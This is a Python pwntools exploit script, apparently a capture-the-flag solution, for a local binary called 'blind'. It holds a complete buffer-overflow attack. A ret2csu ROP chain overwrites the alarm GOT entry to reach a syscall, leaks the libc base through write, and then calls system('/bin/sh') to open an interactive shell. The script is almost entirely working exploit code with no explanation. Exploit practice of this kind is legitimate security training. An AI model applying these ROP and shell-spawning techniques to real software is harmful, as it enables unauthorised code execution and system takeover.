from pwn import *

remote_addr=['127.0.0.1',49156] # 23333 for ubuntu16, 23334 for 18, 23335 for 19
context.terminal = ["/bin/tmux", "sp","-h"]
context.log_level=True

#p=remote(remote_addr[0],remote_addr[1])
elf_path = "./blind"
p = process(elf_path)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF(elf_path)

#gdb.attach(p, 'c')

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr = None):
    if addr:
        print('\033[1;31;40m[+]  %-15s  --> 0x%8x\033[0m'%(s,addr))
    else:
        print('\033[1;32;40m[-]  %-20s \033[0m'%(s))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

def csu(addr,rbx,rbp,r12,r13,r14,r15,ret):
	 payload = p64(addr)    
	 payload += p64(rbx)     
	 payload += p64(rbp)     
	 payload += p64(r12)    
	 payload += p64(r13)    
	 payload += p64(r14)    
	 payload += p64(r15)    
	 payload += p64(ret)   
	 payload += 'A' * 8 * 7     
	 return payload
if __name__ == '__main__':
    bss = 0x601088
    pop_rdi = 0x00000000004007c3
    ret = 0x0000000000400549
    main_addr = 0x4005C0
    alarm_got = elf.got["alarm"]
    read_plt = elf.got["read"]
    buff = 'A' * 88
    buff += csu(0x4007BA,0,1,read_plt,1,alarm_got,0,0x4007A0) # modify alarm 0x19 , rax = 1
    buff += csu(0x4007BA,0,1,alarm_got,0x8,alarm_got,1,0x4007A0) # call write to leak alarm.got
    buff += p64(main_addr)
    sn(buff)
    # gdb.attach(p)
    #sn('\x15') # ubuntu 18.04
    pause()
    pause()
    sleep(1)
    sn('\x19') #ubuntu20.04 
    #p.interactive()   
    libc.address = u64(rv(8)) - 9 - libc.symbols['alarm'] # 20.04
    lg("Libc", libc.address)
    system_addr = libc.symbols["system"]
    sh_addr = libc.search("/bin/sh").next()
    lg("system_addr", system_addr)
    lg("sh_addr", sh_addr)
    buff = 'A' * 88  + p64(pop_rdi) + p64(sh_addr)  + p64(ret) + p64(system_addr)
    #buff = buff.ljust(0x500,'\x00')
    gdb.attach(p)
    sn(buff)
    
    p.interactive()
